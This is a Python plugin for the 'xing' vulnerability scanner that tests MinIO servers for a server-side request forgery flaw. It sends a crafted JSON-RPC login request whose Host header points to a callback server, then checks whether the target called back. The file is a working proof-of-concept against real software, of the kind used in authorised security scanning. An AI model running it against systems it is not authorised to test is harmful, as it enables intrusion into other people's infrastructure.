import requests
from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType
import reverse


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "MinIO SSRF"
        self.app_name = "MinIO"
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        rev_token = reverse.request_code('headers["User-Agent"].contains("Go-http-client") && url.contains("test")')
        url = target + "/minio/webrpc"
        try:
            requests.post(url, headers={"Host": reverse.config.reverse_url}, json={
                "id": 1,
                "jsonrpc": "2.0",
                "params": {
                    "token": "test"
                },
                "method": "web.LoginSTS"
            })
        except Exception:
            pass
        if reverse.check(rev_token):
            return url
